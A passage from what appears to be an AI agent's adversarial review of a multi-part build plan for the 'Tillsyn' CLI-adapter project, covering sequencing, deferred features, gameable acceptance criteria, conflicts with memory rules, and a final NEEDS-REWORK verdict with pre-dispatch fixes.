**Conclusion:** CONFIRMED. F.7.3 and F.7.5 must split before dispatch. Per MEMORY rule `feedback_decomp_small_parallel_plans.md`: "Default decomp for any drop with >1 package or >2 surfaces is ≤N small parallel planners (≤15min each, one surface/package)." F.7.3 alone touches 1 package but 5+ rendering surfaces = >2 surfaces threshold. Mandate split.

**Unknowns:** Whether the LOC estimates hold. Test-cost dominated, so possibly larger. Mitigated by splitting earlier.

---

## 12. F.7.17 sequencing parallelism

**Verdict:** NIT.

**Premises:** F.7.17 sequence: Schema-1 → adapter scaffold → claudeAdapter → MockAdapter → dispatcher wiring → manifest cli_kind → permission_grants cli_kind → BindingResolved → CLI-agnostic monitor refactor. Are there parallelizable adjacent droplets the plan serializes?

**Evidence:** Walk F.7.17 DAG (F7_17_CLI_ADAPTER_PLAN.md lines 84-145):

- **F.7.17.1 (Schema-1)** → F.7.17.2 (Pure types) AND F.7.17.8 (BindingResolved) — DAG already shows these as parallel branches. OK.
- **F.7.17.6 (manifest cli_kind)** AND **F.7.17.7 (permission_grants cli_kind)** — both depend on F.7.17.5; DAG (line 117) shows them as parallel `+----+----+` siblings. OK.
- **F.7.17.10 (marketplace install paper-spec)** sequenced after F.7.17.9. But F.7.17.10 is MD-only (no Go); could land in parallel with ANY droplet after F.7.17.1 (its only real prereq is the schema-1 fields existing for the doc to reference). DAG over-serializes.
- **F.7.17.11 (adapter-authoring docs)** — same case. MD-only, depends on F.7.17.4 (MockAdapter); could land in parallel with F.7.17.5/6/7/9.

**Trace or cases:**
- F.7.17.10 + F.7.17.11 are MD-only and could parallelize with any later F.7.17 Go droplet to compress wall-clock time.

**Conclusion:** NIT. Two MD-only droplets are over-serialized. Releasing the parallelism saves ~10-15 minutes of dispatch time. Not blocking.

**Unknowns:** None.

---

## 13. F.7.18 round-history fully deferred

**Verdict:** REFUTED.

**Premises:** Round-history aggregation deferred entirely — when fix-builder loop fires in Drop 5 dogfood, will the lack of aggregation produce visible pain?

**Evidence:** L12 + F.7.18 acceptance: "metadata.spawn_history[]` is audit-only. Round-history aggregation DEFERRED. Future need addressed via `prior_round_*` rules (worklog / gate output / QA findings), not raw stream-json."

Drop 5 dogfood scenarios that might exercise round-history:
1. **Build droplet fails QA → fix-builder spawned with prior round's QA findings as input.** Without round-history, fix-builder gets ONLY the new QA's findings (not the prior builder's stream-json). The fix-builder doesn't need stream-json — it needs the prior worklog or QA output. Both of those are MD files that exist on disk regardless of metadata.spawn_history.
2. **Builder fails twice → orchestrator decides whether to escalate to dev.** Decision is based on `len(spawn_history) ≥ 2` (count of attempts), not on stream-json content. F.7.9 acceptance confirms `spawn_history[]` carries that count.
3. **Dashboard rendering of cost-per-droplet.** F.7.9's `actual_cost_usd` + `spawn_history[].total_cost_usd` cover this.
4. **Auditing a stuck builder.** Worklog MD + gate output capture this. Stream-json round-history would be redundant.

**Trace or cases:** Every realistic Drop 5 scenario can be served by worklog/gate-output/QA-findings rules + the audit-only `spawn_history[]` count. Raw stream-json is never the input shape an LLM agent wants.

**Conclusion:** REFUTED. Deferral is realistic. The doc-comment requirement on F.7.9's `spawn_history[]` field (per F.7.18.6) is the load-bearing safeguard against future contributors mistakenly building round-history aggregation. As long as that doc-comment lands, the deferral holds.

**Unknowns:** Whether F.7.18.6 lands as standalone or absorbed into F.7.9 (Q1). Either route preserves the constraint.

---

## 14. Per-droplet acceptance gaming

**Verdict:** CONFIRMED (3 random droplets, 2 have gameable acceptance criteria).

**Premises:** Pick 3 droplets at random. Are acceptance criteria specific enough that a builder couldn't game them?

**Evidence:** Sampling F.7-CORE F.7.7 (gitignore), F.7.17.10 (marketplace paper-spec), and F.7.18.5 (default-template seeds).

**F.7-CORE F.7.7 (gitignore auto-add):**
- "Reads `<worktree>/.gitignore` if exists." — concrete.
- "Checks line-by-line for exact match `.tillsyn/spawns/` (with or without trailing slash variants `.tillsyn/spawns`, `/.tillsyn/spawns`, etc. — checks 4 forms)." — explicitly enumerates the 4 forms. Concrete. Not gameable.
- "If absent, appends `.tillsyn/spawns/\n` to file. Returns `added = true`." — concrete.

**Verdict for F.7.7: NOT GAMEABLE.** Acceptance criteria are tight enough that a builder must implement the specific 4-form match.

**F.7.17.10 (marketplace install paper-spec):**
- "displays the full set of `command` argv-lists to the dev in a clear list format." — **GAMEABLE**: "clear list format" is subjective. A builder could ship a single-line comma-separated list and claim it's "clear." No sample format pinned.
- "Requires explicit `y/N` confirmation. Default is `N` (refuse-on-empty-input)." — concrete.
- "On `y`: writes the template into `<project>/.tillsyn/template.toml`; subsequent `templates.Load` enforces the regex + denylist checks." — concrete.
- Acceptance criterion ABSENT: "doc must include a worked example of the dev-facing prompt text." Without this, the builder ships a one-paragraph paper-spec and calls it done.

**Verdict for F.7.17.10: PARTIALLY GAMEABLE.** Add: "Doc MUST include a verbatim worked example of the install-time prompt — exact text the CLI prints, exact format of the command-list display."

**F.7.18.5 (default-template seeds):**
- "`[agent_bindings.build.context]` block: `parent = true`, `parent_git_diff = true`, `ancestors_by_kind = ["plan"]`, `delivery = "file"`, `max_chars = 50000`, `max_rule_duration = "500ms"`." — every value is specific. Not gameable.
- "Default-template-load integration test asserts: `default.toml` loads clean ... `tpl.AgentBindings[domain.KindBuild].Context.Parent == true` (and equivalents for the other 5 in-scope bindings)." — concrete; test asserts decoded values byte-for-byte.
- "**NO `[context]` block** for `commit`, `research`, `closeout`, `refinement`, `discussion`, `human-verify` bindings." — concrete (negative assertion).

**Verdict for F.7.18.5: NOT GAMEABLE.** Tight.

**Trace or cases:**
- F.7.7 — tight.
- F.7.17.10 — gameable on prompt-format spec.
- F.7.18.5 — tight.

**Cross-check** on a 4th droplet because F.7.17.10 was MD-only (which has weaker acceptance shape by design):

**F.7-CORE F.7.4 (stream-JSON monitor):**
- "Action item `metadata.actual_cost_usd` written from `TerminalReport.Cost` (when non-nil) on terminal-state transition." — concrete.
- "Truncated stream (no terminal event) — dispatcher monitor reports `terminal_reason = "stream_unavailable"`." — concrete sentinel value.
- BUT: "Dispatcher monitor in `monitor.go` stays CLI-agnostic — it consumes `StreamEvent` from `adapter.ParseStreamEvent`, does NOT branch on `cli_kind`." — **GAMEABLE**: "does NOT branch on `cli_kind`" is verifiable by source-grep, but builder could leave a `_ = cliKind` no-op and pass. Acceptance should say: "monitor.go has zero references to `CLIKind` constants OR `cli_kind` string literal; verified by `grep -L cli_kind monitor.go` returning empty."

**Verdict:** F.7.4 is also **partially gameable** on the CLI-agnosticism property — needs grep-based assertion.

**Conclusion:** CONFIRMED. 2 of 4 sampled droplets have gameable acceptance criteria. Pre-dispatch tightening:
- F.7.17.10: add verbatim worked-example requirement.
- F.7.4: add grep-based zero-reference assertion for cli_kind in monitor.go.
- Audit other droplets for similar "subjectively-clear" or "doesn't reference X" phrasings; convert to grep / source-grep / golden-fixture assertions.

**Unknowns:** Whether other droplets I didn't sample have similar issues. Random sample of 4 with 2 gaming = 50% — enough to motivate a sweep.

---

## 15. Memory-rule conflicts

**Verdict:** CONFIRMED (1 of 5 rules cited in attack 15 has a partial gap; rest are honored).

**Premises:** Cross-check plan against MEMORY rules.

**Evidence rule-by-rule:**

**`feedback_no_migration_logic_pre_mvp.md` — multiple schema additions in 4c.**
- F.7.5 acceptance line 504: "Pre-MVP rule callout in commit message + droplet acceptance: 'Schema change is dev-fresh-DB; no migration code per `feedback_no_migration_logic_pre_mvp.md`. Dev deletes `~/.tillsyn/tillsyn.db` before next launch.'" — explicit.
- F.7.17.7 same pattern — explicit.
- F.7.18.1 + F.7.18.2 schema additions on `templates.AgentBinding` + `templates.Template` are TOML-side, not SQLite — TOML deserialization handles missing-keys gracefully (zero-value fields). No DB migration needed.
- F.7.9 metadata extension on `domain.ActionItem` — JSON-blob serialization (per acceptance line 606 "JSON-encoded metadata blob OR new columns"). If JSON blob, existing rows survive missing-fields. If new columns, DB needs fresh-init. Acceptance does NOT pin which option, AND does NOT add a fresh-DB callout. **Partial gap.**

**Verdict for migration rule:** Mostly honored. F.7.9 needs the same fresh-DB callout F.7.5 has IF it picks the new-column option. Add to F.7.9 acceptance: "Either pick JSON-blob (survives missing fields) OR pick new columns + add fresh-DB callout per `feedback_no_migration_logic_pre_mvp.md`."

**`feedback_orchestrator_no_build.md` — orchestrator never edits Go code.**
- Master PLAN.md §6 line 142: "**Filesystem-MD mode.** No Tillsyn-runtime per-droplet plan items." Implicit: each Go-touching droplet routes through a builder.
- F.7.11 (architecture docs) — MD-only; per Q7 might be orchestrator-authored. CLAUDE.md `feedback_md_update_qa.md` allows orchestrator MD edits. Honored.
- F.7.17.10 + F.7.17.11 — MD-only. Same.

**Verdict for no-build rule:** Honored.

**`feedback_opus_builders_pre_mvp.md` — every builder spawn carries `model: opus`.**
- Every per-droplet spec in F.7-CORE / F.7.17 / F.7.18 includes "**Builder model:** opus." Confirmed across all 33 droplets.

**Verdict for opus-builders rule:** Honored.

**`feedback_no_closeout_md_pre_dogfood.md` — no LEDGER/REFINEMENTS/WIKI_CHANGELOG/HYLLA_FEEDBACK rollups pre-dogfood.**
- Master PLAN.md §6 line 137: "No closeout MD rollups (LEDGER / WIKI_CHANGELOG / REFINEMENTS / HYLLA_FEEDBACK) — pre-dogfood. Each droplet writes a per-droplet worklog only."
- F.7.11 (architecture docs) acceptance line 702: "No closeout MD rollups produced (pre-MVP rule). The architecture docs are dev-facing reference, not drop ledger." Confirmed.

**Verdict for no-closeout rule:** Honored.

**`feedback_decomp_small_parallel_plans.md` — default decomp ≤N small parallel planners (≤15min each, one surface/package).**
- F.7-CORE F.7.3 violates (8+ files, multiple rendering surfaces). See attack 11.
- F.7-CORE F.7.5 violates (5+ files, 2 architectural surfaces). See attack 11.
- Otherwise honored.

**Verdict for decomp rule:** **VIOLATED at F.7.3 + F.7.5.** Already CONFIRMED in attack 11.

**Trace or cases:**
- migration: F.7.9 needs disambiguation (JSON-blob vs new column).
- decomp: F.7.3 + F.7.5 are too big.

**Conclusion:** CONFIRMED. Two memory-rule conflicts (one mild, one already counted in attack 11). Pre-dispatch fixes:
1. F.7.9: pin JSON-blob OR add fresh-DB callout.
2. F.7.3 + F.7.5: split per attack 11 recommendations.

**Unknowns:** None.

---

## Final Verdict: NEEDS-REWORK

5 confirmed counterexamples with material impact require pre-dispatch fixes:

1. **#2 cross-plan declaration mismatch** — three implicit struct extensions (Tillsyn struct ownership, Manifest field), one mis-aimed prereq pointer (F.7-CORE F.7.1 → F.7.17.1 should be → F.7.17.2). Resolve via pre-dispatch synthesis pass that converts prose handoffs into machine-readable `blocked_by` IDs and assigns single-owner-droplet for each shared struct.

2. **#5 L4 closed env baseline missing critical vars** — proxy/TLS vars (`HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, lowercase, `SSL_CERT_FILE`, `SSL_CERT_DIR`) plus `TERM`/`SHELL` likely required for production claude usage. Either widen baseline OR loud-document in F.7.17.11 + F.7.7.16 default-template that adopters must declare.

3. **#6 L6 denylist incompleteness** — 23+ unlisted interpreters provide RCE bypass. Switch to allowlist OR explicitly relegate denylist to defense-in-depth and pin install-time confirmation as the load-bearing trust boundary.

4. **#11 F.7-CORE droplet sizing** — F.7.3 (8+ files, 5+ rendering surfaces) and F.7.5 (5+ files, 2 surfaces) too big for single-builder spawns. Split per recommendations.

5. **#14 acceptance-criteria gaming** + **#15 memory-rule conflicts** — F.7.17.10 needs verbatim prompt example; F.7.4 needs grep-based cli_kind zero-reference assertion; F.7.9 needs JSON-blob-vs-new-column disambiguation.

The plan reflects Round-1 + Round-2 falsification rework competently. The remaining holes are downstream of those rounds — they emerged because R1/R2 attacked the SKETCH, not the per-droplet acceptance criteria. A pre-dispatch fix-up pass on these five points unblocks dispatch.

---

## Hylla Feedback

`N/A — review touched non-Go files only` (PLAN.md + three sub-plans, all Markdown). The two Go cross-checks I performed (`internal/app/git_status.go` for the `filteredGitEnv` precedent in attack 5; `internal/app/dispatcher/spawn.go` for the 4a.19 stub in attacks 2 and 11) used `Read` directly rather than Hylla because both files were referenced by exact path in the plan text — direct file Read is faster than a Hylla query for a known path. No Hylla queries issued; no miss to record.
